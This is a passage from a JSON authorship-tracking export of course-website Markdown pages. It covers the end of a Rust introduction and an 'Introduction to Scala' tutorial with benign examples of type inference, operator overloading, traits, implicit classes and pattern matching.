        "lineNumber": 196,
        "author": {
          "gitId": "-"
        },
        "content": "* [Comparison with other languages](https://github.com/ctjhoa/rust-learning#comparison-with-other-languages)"
      },
      {
        "lineNumber": 197,
        "author": {
          "gitId": "-"
        },
        "content": "* [Cheat sheets](https://github.com/ctjhoa/rust-learning#cheat-sheets)"
      },
      {
        "lineNumber": 198,
        "author": {
          "gitId": "-"
        },
        "content": "* [Ownership / Concurrency](https://github.com/ctjhoa/rust-learning#ownership--concurrency)"
      },
      {
        "lineNumber": 199,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 200,
        "author": {
          "gitId": "-"
        },
        "content": "More resources: [Rust Official Documentation](https://www.rust-lang.org/en-US/documentation.html)"
      },
      {
        "lineNumber": 201,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 202,
        "author": {
          "gitId": "-"
        },
        "content": "## Why not Rust"
      },
      {
        "lineNumber": 203,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 204,
        "author": {
          "gitId": "-"
        },
        "content": "Choosing the right language for the job is important so let\u0027s look at a few possible reasons not to use Rust:"
      },
      {
        "lineNumber": 205,
        "author": {
          "gitId": "-"
        },
        "content": "- [The ecosystem is not as mature](https://github.com/ctjhoa/rust-learning#are-we--yet)"
      },
      {
        "lineNumber": 206,
        "author": {
          "gitId": "-"
        },
        "content": "- Rust\u0027s compiler is extremely strict in that it enforces ownership, i.e. needs time getting used to. However, it is [probably debatable if this approach is a worthwhile trade-off](https://news.ycombinator.com/item?id\u003d16202373)."
      },
      {
        "lineNumber": 207,
        "author": {
          "gitId": "-"
        },
        "content": "- While not a completely similar language, [Go feels immediately more productive](https://news.ycombinator.com/item?id\u003d13430108)"
      },
      {
        "lineNumber": 208,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 209,
        "author": {
          "gitId": "-"
        },
        "content": "Some other discussions on why not Rust:"
      },
      {
        "lineNumber": 210,
        "author": {
          "gitId": "-"
        },
        "content": "- [How can Rust improve](https://www.reddit.com/r/rust/comments/7p75ab/why_rust_what_i_want_changed_for_rust_to_help_way/)"
      },
      {
        "lineNumber": 211,
        "author": {
          "gitId": "-"
        },
        "content": "- [Why not Rust](https://www.reddit.com/r/rust/comments/6hp54n/blog_why_not_to_use_rust/)"
      },
      {
        "lineNumber": 212,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 213,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/div\u003e"
      }
    ],
    "authorContributionMap": {
      "Tejas2805": 4,
      "jamessspanggg": 1,
      "iskandarzulkarnaien": 11,
      "-": 197
    }
  },
  {
    "path": "contents/scala/Scala.md",
    "fileType": "md",
    "lines": [
      {
        "lineNumber": 1,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cfrontmatter\u003e"
      },
      {
        "lineNumber": 2,
        "author": {
          "gitId": "-"
        },
        "content": "  title: Introduction to Scala"
      },
      {
        "lineNumber": 3,
        "author": {
          "gitId": "-"
        },
        "content": "  header: pagetop.md"
      },
      {
        "lineNumber": 4,
        "author": {
          "gitId": "-"
        },
        "content": "  footer: footer.md"
      },
      {
        "lineNumber": 5,
        "author": {
          "gitId": "-"
        },
        "content": "  head: head.md"
      },
      {
        "lineNumber": 6,
        "author": {
          "gitId": "-"
        },
        "content": "  siteNav: mainNav.md"
      },
      {
        "lineNumber": 7,
        "author": {
          "gitId": "-"
        },
        "content": "  pageNav: 3"
      },
      {
        "lineNumber": 8,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/frontmatter\u003e"
      },
      {
        "lineNumber": 9,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 10,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cdiv class\u003d\"website-content\"\u003e"
      },
      {
        "lineNumber": 11,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 12,
        "author": {
          "gitId": "-"
        },
        "content": "{{ booktitle | safe }}"
      },
      {
        "lineNumber": 13,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 14,
        "author": {
          "gitId": "-"
        },
        "content": "# Introduction to Scala"
      },
      {
        "lineNumber": 15,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 16,
        "author": {
          "gitId": "-"
        },
        "content": "**Author(s): [Wang Chao](https://github.com/fzdy1914)**"
      },
      {
        "lineNumber": 17,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 18,
        "author": {
          "gitId": "-"
        },
        "content": "Reviewers: [Jiang Chunhui](https://github.com/Adoby7), [Wang Junming](https://github.com/junming403)"
      },
      {
        "lineNumber": 19,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 20,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "\u003cbox id\u003d\"article-toc\"\u003e"
      },
      {
        "lineNumber": 21,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": ""
      },
      {
        "lineNumber": 22,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Overview‎](#overview)"
      },
      {
        "lineNumber": 23,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Noteworthy Scala Features‎](#noteworthy-scala-features)"
      },
      {
        "lineNumber": 24,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Type Inference‎](#type-inference)"
      },
      {
        "lineNumber": 25,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Operator Overloading‎](#operator-overloading)"
      },
      {
        "lineNumber": 26,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Mixins, Traits‎](#mixins-traits)"
      },
      {
        "lineNumber": 27,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Type Enrichment‎](#type-enrichment)"
      },
      {
        "lineNumber": 28,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Pattern Matching‎](#pattern-matching)"
      },
      {
        "lineNumber": 29,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Getting Started‎](#getting-started)"
      },
      {
        "lineNumber": 30,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "\u003c/box\u003e"
      },
      {
        "lineNumber": 31,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": ""
      },
      {
        "lineNumber": 32,
        "author": {
          "gitId": "-"
        },
        "content": "## Overview"
      },
      {
        "lineNumber": 33,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 34,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e Scala combines object-oriented and functional programming in one concise, high-level language. Scala\u0027s static types help avoid bugs in complex applications, and its JVM and JavaScript runtimes let you build high-performance systems with easy access to huge ecosystems of libraries. -- [Scala Website](https://www.scala-lang.org/)"
      },
      {
        "lineNumber": 35,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 36,
        "author": {
          "gitId": "-"
        },
        "content": "Let\u0027s look at some characteristics of Scala mentioned in the above quote:"
      },
      {
        "lineNumber": 37,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 38,
        "author": {
          "gitId": "-"
        },
        "content": "* **Scala supports _object-oriented_ programming**: Every value in Scala is an object, including functions and primitives. Classes are extended by *subclassing* and a flexible *mixin-based* mechanism to avoid the problems of multiple inheritance."
      },
      {
        "lineNumber": 39,
        "author": {
          "gitId": "-"
        },
        "content": "* **Scala supports _functional_ programming**: Every function in Scala is a value. Scala provides a lightweight syntax for defining [*anonymous functions*](https://docs.scala-lang.org/tour/basics.html#functions). It also support many other features of FP including [*higher-order functions*](https://docs.scala-lang.org/tour/higher-order-functions.html), [*nested functions*](https://docs.scala-lang.org/tour/nested-functions.html), [*currying*](https://docs.scala-lang.org/tour/multiple-parameter-lists.html), [*pattern matching*](https://docs.scala-lang.org/tour/pattern-matching.html), *immutability* and *lazy evaluation*."
      },
      {
        "lineNumber": 40,
        "author": {
          "gitId": "-"
        },
        "content": "* **Scala is _statically typed_**: It enforces type checking like verifying and enforcing the constraints of types at compile-time. "
      },
      {
        "lineNumber": 41,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "* **Scala can work the Java and JavaScript runtimes**: Scala provides language interoperability with Java, so that libraries written in Java can be referenced directly in Scala. Also, by *[Scala.js](https://www.scala-js.org/)*, Scala code can be easily compiled to JavaScript."
      },
      {
        "lineNumber": 42,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 43,
        "author": {
          "gitId": "-"
        },
        "content": "As Scala supports both OOP and FP paradigms, it is considered a *multi-paradigm* language. Furthermore, Scala proponents claim it to have a simple syntax that can produce elegant code."
      },
      {
        "lineNumber": 44,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 45,
        "author": {
          "gitId": "-"
        },
        "content": "## Noteworthy Scala Features"
      },
      {
        "lineNumber": 46,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 47,
        "author": {
          "gitId": "-"
        },
        "content": "Given below are some noteworthy Scala features:"
      },
      {
        "lineNumber": 48,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 49,
        "author": {
          "gitId": "-"
        },
        "content": "### Type Inference"
      },
      {
        "lineNumber": 50,
        "author": {
          "gitId": "-"
        },
        "content": "Scala allows [**type inference**](https://docs.scala-lang.org/tour/type-inference.html), which means it detects the data type of an expression automatically. The user is not required to annotate redundant type information in Scala."
      },
      {
        "lineNumber": 51,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 52,
        "author": {
          "gitId": "-"
        },
        "content": "Type Inference Example:"
      },
      {
        "lineNumber": 53,
        "author": {
          "gitId": "-"
        },
        "content": "```scala"
      },
      {
        "lineNumber": 54,
        "author": {
          "gitId": "-"
        },
        "content": "var x \u003d \"foo\""
      },
      {
        "lineNumber": 55,
        "author": {
          "gitId": "-"
        },
        "content": "var y \u003d 1.5"
      },
      {
        "lineNumber": 56,
        "author": {
          "gitId": "-"
        },
        "content": "val z \u003d List(1, 2, 3)"
      },
      {
        "lineNumber": 57,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 58,
        "author": {
          "gitId": "-"
        },
        "content": "x \u003d 3 // Error: type mismatch"
      },
      {
        "lineNumber": 59,
        "author": {
          "gitId": "-"
        },
        "content": "x \u003d \"bar\" // OK"
      },
      {
        "lineNumber": 60,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 61,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 62,
        "author": {
          "gitId": "-"
        },
        "content": "### Operator Overloading"
      },
      {
        "lineNumber": 63,
        "author": {
          "gitId": "-"
        },
        "content": "All operators in Scala such as `+`, `-`, `*`, `/` are actually methods."
      },
      {
        "lineNumber": 64,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 65,
        "author": {
          "gitId": "-"
        },
        "content": "Normally, we write addition in following way:"
      },
      {
        "lineNumber": 66,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 67,
        "author": {
          "gitId": "-"
        },
        "content": "`val a \u003d 1 + 2`{.scala}"
      },
      {
        "lineNumber": 68,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 69,
        "author": {
          "gitId": "-"
        },
        "content": "However, in Scala, it will be interpreted as following:"
      },
      {
        "lineNumber": 70,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 71,
        "author": {
          "gitId": "-"
        },
        "content": "`val a \u003d 1.+(2)`{.scala}"
      },
      {
        "lineNumber": 72,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 73,
        "author": {
          "gitId": "-"
        },
        "content": "Knowing that, we are able to overload operators just like method overloading. It allows us to redefine the behavior of arithmetic operators and give them meaning for our own custom classes."
      },
      {
        "lineNumber": 74,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 75,
        "author": {
          "gitId": "-"
        },
        "content": "Following is a *ComplexInt* class which uses operator overloading."
      },
      {
        "lineNumber": 76,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 77,
        "author": {
          "gitId": "-"
        },
        "content": "```scala"
      },
      {
        "lineNumber": 78,
        "author": {
          "gitId": "-"
        },
        "content": "case class ComplexInt(real: Int, im: Int) {"
      },
      {
        "lineNumber": 79,
        "author": {
          "gitId": "-"
        },
        "content": "  def + (other: ComplexInt) \u003d ComplexInt(real + other.real, im + other.im)"
      },
      {
        "lineNumber": 80,
        "author": {
          "gitId": "-"
        },
        "content": "  def * (other: ComplexInt) \u003d ComplexInt("
      },
      {
        "lineNumber": 81,
        "author": {
          "gitId": "-"
        },
        "content": "    real * other.real - im * other.im,"
      },
      {
        "lineNumber": 82,
        "author": {
          "gitId": "-"
        },
        "content": "    real * other.im + im * other.real"
      },
      {
        "lineNumber": 83,
        "author": {
          "gitId": "-"
        },
        "content": "  )"
      },
      {
        "lineNumber": 84,
        "author": {
          "gitId": "-"
        },
        "content": "  def unary_- \u003d ComplexInt(-real, -im)"
      },
      {
        "lineNumber": 85,
        "author": {
          "gitId": "-"
        },
        "content": "  def - (other: ComplexInt) \u003d this + -other"
      },
      {
        "lineNumber": 86,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 87,
        "author": {
          "gitId": "-"
        },
        "content": "  override def toString \u003d real + \" + \" + im + \"i\""
      },
      {
        "lineNumber": 88,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 89,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 90,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 91,
        "author": {
          "gitId": "-"
        },
        "content": "We are able to use the class like below:"
      },
      {
        "lineNumber": 92,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 93,
        "author": {
          "gitId": "-"
        },
        "content": "```scala"
      },
      {
        "lineNumber": 94,
        "author": {
          "gitId": "-"
        },
        "content": "val a \u003d ComplexInt(1, 1)"
      },
      {
        "lineNumber": 95,
        "author": {
          "gitId": "-"
        },
        "content": "val b \u003d ComplexInt(1, -1)"
      },
      {
        "lineNumber": 96,
        "author": {
          "gitId": "-"
        },
        "content": "val c \u003d a * b"
      },
      {
        "lineNumber": 97,
        "author": {
          "gitId": "-"
        },
        "content": "val d \u003d -c + a"
      },
      {
        "lineNumber": 98,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 99,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 100,
        "author": {
          "gitId": "-"
        },
        "content": "In contrast, this is how the same operations would look like if written in Java:"
      },
      {
        "lineNumber": 101,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 102,
        "author": {
          "gitId": "-"
        },
        "content": "```java"
      },
      {
        "lineNumber": 103,
        "author": {
          "gitId": "-"
        },
        "content": "ComplexInt a \u003d new ComplexInt(1, 1);"
      },
      {
        "lineNumber": 104,
        "author": {
          "gitId": "-"
        },
        "content": "ComplexInt b \u003d new ComplexInt(1, -1);"
      },
      {
        "lineNumber": 105,
        "author": {
          "gitId": "-"
        },
        "content": "ComplexInt c \u003d a.times(b);"
      },
      {
        "lineNumber": 106,
        "author": {
          "gitId": "-"
        },
        "content": "ComplexInt d \u003d (c.negative()).add(a);"
      },
      {
        "lineNumber": 107,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 108,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 109,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 110,
        "author": {
          "gitId": "-"
        },
        "content": "### Mixins, Traits"
      },
      {
        "lineNumber": 111,
        "author": {
          "gitId": "-"
        },
        "content": "In scala, types and behavior of objects are described by *classes* and *traits*. "
      },
      {
        "lineNumber": 112,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 113,
        "author": {
          "gitId": "-"
        },
        "content": "[*Traits*](https://docs.scala-lang.org/tour/traits.html) are used to share interfaces and fields between classes, which are similar to Java\u0027s interfaces. "
      },
      {
        "lineNumber": 114,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 115,
        "author": {
          "gitId": "-"
        },
        "content": "Classes are extended by *subclassing* and a flexible *mixin-based* mechanism to avoid the problems of multiple inheritance."
      },
      {
        "lineNumber": 116,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 117,
        "author": {
          "gitId": "-"
        },
        "content": "Classes cannot have *static members*. A singleton object with same name of the class can be used to achieve the same effect. A singleton object is basically a class that can have only one instance."
      },
      {
        "lineNumber": 118,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 119,
        "author": {
          "gitId": "-"
        },
        "content": "The following Scala code illustrates some of the concepts mentioned above:"
      },
      {
        "lineNumber": 120,
        "author": {
          "gitId": "-"
        },
        "content": "```scala"
      },
      {
        "lineNumber": 121,
        "author": {
          "gitId": "-"
        },
        "content": "abstract class ParentTrait {"
      },
      {
        "lineNumber": 122,
        "author": {
          "gitId": "-"
        },
        "content": "  // abstract"
      },
      {
        "lineNumber": 123,
        "author": {
          "gitId": "-"
        },
        "content": "  def print()"
      },
      {
        "lineNumber": 124,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 125,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 126,
        "author": {
          "gitId": "-"
        },
        "content": "class Sample extends ParentTrait {"
      },
      {
        "lineNumber": 127,
        "author": {
          "gitId": "-"
        },
        "content": "  override def print() {"
      },
      {
        "lineNumber": 128,
        "author": {
          "gitId": "-"
        },
        "content": "    println(\"print in Sample\")"
      },
      {
        "lineNumber": 129,
        "author": {
          "gitId": "-"
        },
        "content": "  }"
      },
      {
        "lineNumber": 130,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 131,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 132,
        "author": {
          "gitId": "-"
        },
        "content": "trait TraitA extends ParentTrait {"
      },
      {
        "lineNumber": 133,
        "author": {
          "gitId": "-"
        },
        "content": "  abstract override def print() {"
      },
      {
        "lineNumber": 134,
        "author": {
          "gitId": "-"
        },
        "content": "    println(\"print in TraitA\")"
      },
      {
        "lineNumber": 135,
        "author": {
          "gitId": "-"
        },
        "content": "    super.print()"
      },
      {
        "lineNumber": 136,
        "author": {
          "gitId": "-"
        },
        "content": "  }"
      },
      {
        "lineNumber": 137,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 138,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 139,
        "author": {
          "gitId": "-"
        },
        "content": "trait TraitB extends ParentTrait {"
      },
      {
        "lineNumber": 140,
        "author": {
          "gitId": "-"
        },
        "content": "  abstract override def print() {"
      },
      {
        "lineNumber": 141,
        "author": {
          "gitId": "-"
        },
        "content": "    println(\"print in TraitB\")"
      },
      {
        "lineNumber": 142,
        "author": {
          "gitId": "-"
        },
        "content": "    super.print()"
      },
      {
        "lineNumber": 143,
        "author": {
          "gitId": "-"
        },
        "content": "  }"
      },
      {
        "lineNumber": 144,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 145,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 146,
        "author": {
          "gitId": "-"
        },
        "content": "object Sample {"
      },
      {
        "lineNumber": 147,
        "author": {
          "gitId": "-"
        },
        "content": "  def main(args: Array[String]): Unit \u003d {"
      },
      {
        "lineNumber": 148,
        "author": {
          "gitId": "-"
        },
        "content": "    val example \u003d new Sample with TraitA with TraitB"
      },
      {
        "lineNumber": 149,
        "author": {
          "gitId": "-"
        },
        "content": "   example.print()"
      },
      {
        "lineNumber": 150,
        "author": {
          "gitId": "-"
        },
        "content": "  }"
      },
      {
        "lineNumber": 151,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 152,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 153,
        "author": {
          "gitId": "-"
        },
        "content": "The output from running the above code:"
      },
      {
        "lineNumber": 154,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 155,
        "author": {
          "gitId": "-"
        },
        "content": "print in TraitB"
      },
      {
        "lineNumber": 156,
        "author": {
          "gitId": "-"
        },
        "content": "print in TraitA"
      },
      {
        "lineNumber": 157,
        "author": {
          "gitId": "-"
        },
        "content": "print in Sample"
      },
      {
        "lineNumber": 158,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 159,
        "author": {
          "gitId": "-"
        },
        "content": "The explanation is that the call to `print()`  executes the code in `TraitB`, which is the last trait mixed in. Then, through the `super()` calls, it threads back through the other mixin traits. And eventually to the code in `Sample`. Note thath none of the traits inherited from others. "
      },
      {
        "lineNumber": 160,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 161,
        "author": {
          "gitId": "-"
        },
        "content": "This is similar to the [_decorator pattern_](https://en.wikipedia.org/wiki/Decorator_pattern) but is more concise and less error-prone. In other languages, a similar effect could be achieved with a long linear chain of inheritance. But the disadvantage is that for every possible combination, we need to declare an inheritance chain for it."
      },
      {
        "lineNumber": 162,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 163,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 164,
        "author": {
          "gitId": "-"
        },
        "content": "### Type Enrichment"
      },
      {
        "lineNumber": 165,
        "author": {
          "gitId": "-"
        },
        "content": "Have you ever needed to add new function to an existing library? An implicit class in Scala can help you to do so. This technique allows new methods to be added to an existing class using an add-on library such that only code that imports the add-on library gets the new functionality, and all other code is unaffected. See the code below:"
      },
      {
        "lineNumber": 166,
        "author": {
          "gitId": "-"
        },
        "content": "```scala"
      },
      {
        "lineNumber": 167,
        "author": {
          "gitId": "-"
        },
        "content": "object MyExtensions {"
      },
      {
        "lineNumber": 168,
        "author": {
          "gitId": "-"
        },
        "content": "  implicit class IntParity(i: Int) {"
      },
      {
        "lineNumber": 169,
        "author": {
          "gitId": "-"
        },
        "content": "    def isEven \u003d i % 2 \u003d\u003d 0"
      },
      {
        "lineNumber": 170,
        "author": {
          "gitId": "-"
        },
        "content": "    def isOdd  \u003d !isEven"
      },
      {
        "lineNumber": 171,
        "author": {
          "gitId": "-"
        },
        "content": "  }"
      },
      {
        "lineNumber": 172,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 173,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 174,
        "author": {
          "gitId": "-"
        },
        "content": "import MyExtensions._  // bring implicit enrichment into scope"
      },
      {
        "lineNumber": 175,
        "author": {
          "gitId": "-"
        },
        "content": "4.isEven  // -\u003e true"
      },
      {
        "lineNumber": 176,
        "author": {
          "gitId": "-"
        },
        "content": "4.isOdd   // -\u003e false"
      },
      {
        "lineNumber": 177,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 178,
        "author": {
          "gitId": "-"
        },
        "content": "This is the implicit class that extend the library of class `Int`. The name of the class does not matter. After importing this class, we can use `isEven()` and `isOdd()` method just as if it has been declared in the original `Int` class. "
      },
      {
        "lineNumber": 179,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 180,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 181,
        "author": {
          "gitId": "-"
        },
        "content": "### Pattern Matching"
      },
      {
        "lineNumber": 182,
        "author": {
          "gitId": "-"
        },
        "content": "Scala has built-in support for _pattern matching_, which can be thought of as a more extensible version of a `switch` statement, where arbitrary data types can be matched. The `match` operator is used to do the pattern matching."
      },
      {
        "lineNumber": 183,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 184,
        "author": {
          "gitId": "-"
        },
        "content": "There are many kinds of pattern matching in Scala, let\u0027s start with a simplest pattern matching function:"
      },
      {
        "lineNumber": 185,
        "author": {
          "gitId": "-"
        },
        "content": "```scala"
      },
      {
        "lineNumber": 186,
        "author": {
          "gitId": "-"
        },
        "content": "def matchTest(x: Int): String \u003d x match {"
      },
      {
        "lineNumber": 187,
        "author": {
          "gitId": "-"
        },
        "content": "  case 0 \u003d\u003e \"zero\""
      },
      {
        "lineNumber": 188,
        "author": {
          "gitId": "-"
        },
        "content": "  case 1 \u003d\u003e \"one\""
      },
      {
        "lineNumber": 189,
        "author": {
          "gitId": "-"
        },
        "content": "  case 2 \u003d\u003e \"two\""
      },
      {
        "lineNumber": 190,
        "author": {
          "gitId": "-"
        },
        "content": "  case _ \u003d\u003e \"many\""
      },
      {
        "lineNumber": 191,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 192,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 193,
        "author": {
          "gitId": "-"
        },
        "content": "matchTest(0)  // zero"
      },
      {
        "lineNumber": 194,
        "author": {
          "gitId": "-"
        },
        "content": "matchTest(3)  // many"
      },
      {
        "lineNumber": 195,
        "author": {
          "gitId": "-"
        },
        "content": "matchTest(1)  // one"
      },
      {
        "lineNumber": 196,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 197,
        "author": {
          "gitId": "-"
        },
        "content": "The parameter `x` is the left operand of the `match` operator and on the right is an expression with four cases. Each case expression is tried to see if it will match, and the first match will be returned. The last case `_` is a \"catch all\" case which can match all inputs."
      },
      {
        "lineNumber": 198,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 199,
        "author": {
          "gitId": "-"
        },
        "content": "The pattern matching in Scala also includes _Case Class Matching_, _List Matching_, _Type Matching_, _Tuple Matching_ etc. See [here](https://docs.scala-lang.org/tour/pattern-matching.html) for more details."
      },
      {
        "lineNumber": 200,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 201,
        "author": {
          "gitId": "-"
        },
        "content": "Following is an example of [QuickSort](https://en.wikipedia.org/wiki/Quicksort) algorithm to show how strong is Scala\u0027s pattern matching:"
      },
      {
        "lineNumber": 202,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 203,
        "author": {
          "gitId": "-"
        },
        "content": "```scala"
      },
      {
        "lineNumber": 204,
        "author": {
          "gitId": "-"
        },
        "content": "def qsort(list: List[Int]): List[Int] \u003d list match {"
      },
      {
        "lineNumber": 205,
        "author": {
          "gitId": "-"
        },
        "content": "  case Nil \u003d\u003e Nil"
      },
      {
        "lineNumber": 206,
        "author": {
          "gitId": "-"
        },
        "content": "  case pivot :: tail \u003d\u003e"
      },
      {
        "lineNumber": 207,
        "author": {
          "gitId": "-"
        },
        "content": "    val (smaller, rest) \u003d tail.partition(_ \u003c pivot)"
      },
      {
        "lineNumber": 208,
        "author": {
          "gitId": "-"
        },
        "content": "    qsort(smaller) ::: pivot :: qsort(rest)"
      },
      {
        "lineNumber": 209,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 210,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 211,
        "author": {
          "gitId": "-"
        },
        "content": "Explanation of the code:"
      },
      {
        "lineNumber": 212,
        "author": {
          "gitId": "-"
        },
        "content": "* The idea here is that we *partition* a list recursively, sort each part and combine the results together."
      },
      {
        "lineNumber": 213,
        "author": {
          "gitId": "-"
        },
        "content": "* In this case, `Nil` only matches the object `Nil` (Empty list). But `pivot :: tail` matches a non-empty list, and it will destructure the list according to the pattern given. "
      },
      {
        "lineNumber": 214,
        "author": {
          "gitId": "-"
        },
        "content": "In this case, the code will have a variable `pivot` holding the head of the list, and another variable `tail` holding the tail of the list."
      },
      {
        "lineNumber": 215,
        "author": {
          "gitId": "-"
        },
        "content": "* In local variable declarations, tuple matching is used. The return value of the call to `tail.partition` is a tuple. "
      },
      {
        "lineNumber": 216,
        "author": {
          "gitId": "-"
        },
        "content": "In this case, the code will have a variable `smaller` holding the first element of the tuple, and another variable `rest` holding the second element of the list. "
      },
      {
        "lineNumber": 217,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 218,
        "author": {
          "gitId": "-"
        },
        "content": "## Getting Started"
      },
      {
        "lineNumber": 219,
        "author": {
          "gitId": "-"
        },
        "content": "There are mainly two ways to work in Scala."
      },
      {
        "lineNumber": 220,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 221,
        "author": {
          "gitId": "-"
        },
        "content": "1. Using the **IDE**. Refer to the [instructions](https://docs.scala-lang.org/getting-started-intellij-track/getting-started-with-scala-in-intellij.html) for more details."
      },
      {
        "lineNumber": 222,
        "author": {
          "gitId": "-"
        },
        "content": "2. Using the **command line**. Refer to the [instructions](https://docs.scala-lang.org/getting-started-sbt-track/getting-started-with-scala-and-sbt-on-the-command-line.html) for more details."
      },
      {
        "lineNumber": 223,
        "author": {
          "gitId": "-"
        },
